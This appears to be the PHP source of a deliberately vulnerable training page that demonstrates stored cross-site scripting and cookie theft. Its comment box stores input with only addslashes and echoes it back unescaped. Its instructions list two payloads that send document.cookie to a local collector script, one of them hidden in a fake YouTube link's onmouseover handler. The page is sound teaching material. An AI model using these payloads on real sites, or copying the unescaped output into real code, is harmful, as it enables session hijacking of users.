<?php

	if (isset($_POST['newCookie'])){
		$cookie_name = "authKey";
		$cookie_value = md5(microtime());
		setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
		echo "<h2 align='center'> authKey Cookie SET! </h2>";
	}

	if (isset($_POST['outputCookie'])){
		if(isset($_COOKIE['authKey']))
			echo "<h2 align='center'> authKey Cookie: ".$_COOKIE['authKey']."</h2>";
		else
			echo "<h2 align='center'> authKey Cookie: NOT SET </h2>";
	}

	$con = mysqli_connect("db","user","test","myDb");
	if(mysqli_connect_errno())
		echo "Failed to connect to MySQL: " . mysqli_connect_error();

	if (isset($_POST['comment'])){
		$sql = "INSERT INTO comments (comment)
		VALUES ('".addslashes($_POST['comment'])."')";
		if ($con->query($sql) === TRUE)
			echo "<center> successfully added!!!</center>";
		else 
			echo "Error: Unable to Add comment". $conn->error;
	}
	$con->close();
?>


<html>
	<title> Steal cookies </title>
	<style>
		#bord td
		{
			border: 1px solid black;
			border-collapse: collapse;
		}
	</style>

	</style>
		<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
	<style>
		body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
		a {color:blue;}
		h3 {color:blue;}
		h1 {color:blue;}
	</style>

	<body class="w3-light-grey">
		<h1 align="center">  Comment & Cookie Website! </h1>

		<table align="center">
			<tr><td>
			
			<form action="steal_cookies.php" method="post" id="post">
				<textarea rows="6" cols="50" name="comment" placeholder="Leave a comment" maxlength="400"></textarea>
				<table align="center"><tr><td>
				<input type="submit" value="Comment" />
				</td></tr></table>
			</form>


			<form action="steal_cookies.php" method="post">
				<table align="center"><tr><td>
				<input type="submit" name="newCookie" value="New Cookie" />
				<input type="submit" name="outputCookie" value="Output Cookie" />
				</td></tr></table>
			</form>


			</td></tr>

		</table>

		<br />

		<table align="center" id="bord">
			<?php
				$con = mysqli_connect("db","user","test","myDb");
				$sql = "SELECT comment FROM comments";
				$result = $con->query($sql);

				if ($result->num_rows > 0) {
				    // output data of each row
				    echo "<tr><th style='width:35%'>All Comments</th></tr>";
				    while($row = $result->fetch_assoc()) {
				        echo "<tr><td style='width:35%;padding:10px'>".$row["comment"]."<br /></td></tr>";
				    }
				} else {
				    echo "<tr><th style='width:35%'>No Comments!</th></tr>";
				}
				$con->close(); 
			?>
		</table>


		<table align="center">
		<tr><td>
		<form action="clear_comments.php" method="post">
			Clear all comments: <input type="submit" name="clear" value="Clear Table" />
		</form>

		</td></tr>
		</table>

		<div class="w3-card-4 w3-margin w3-white" x>
			<div class="w3-container">
				<br>
				This is simple demonstration page for understanding how cookies can be stole which takes comments as input (POST Method ) and prints all the comments posted as the output. <br>
				New cookie sets a new cookie for the page and Output cookie displays content of the cookie on the page.
				We used get_cookies.php to append cookie data in a local file named stolen_cookies.txt(Check &quot; www &quot; folder). So we will redirect this page to get_cookies.php and cookie will be shared through get method.
				<br><br>
				<b>Try adding following comments and see what happens:</b>
				<ul>
					<li><b>Hiii !!! </b>
						<p> It will simply add a new comment. </p>
					</li>
					<li><b>&lt;script&gt;window.location=&#39;http://localhost:8001/get_cookies.php?cookie=&#39;+escape(document.cookie)&lt;/script&gt;</b>
						<p> Javascript function &quot; window.location &quot;is used to redirect the browser to a new page. We are redirecting to get_cookies.php with cookie as get parameter.</p>
					</li>
					<li><b>Check out this beautiful Youtube video &lt;a href=&#39;https://www.youtube.com/watch?v=ZtFjx3-gRkY&amp;list=RDZtFjx3-gRkY&amp;start_radio=1&#39; onmouseover=&quot;window.location=&#39;http://localhost:8001/get_cookies.php?cookie=&#39;+escape(document.cookie)&quot; &gt; https://www.youtube.com/ &lt;/a&gt;</b>
						<p>This is interesting way to get cookie. An attacker leaves a comment where he asks other users to check a video. When users hover over the link, the cookie is stolen and user is shown a broken page.</p>
					</li>

				</ul>
			</div>
		</div>

		<h3><p align="center"> <a href="index.php"> Go to Home </a></p></h3>

		
	</body>
</html> 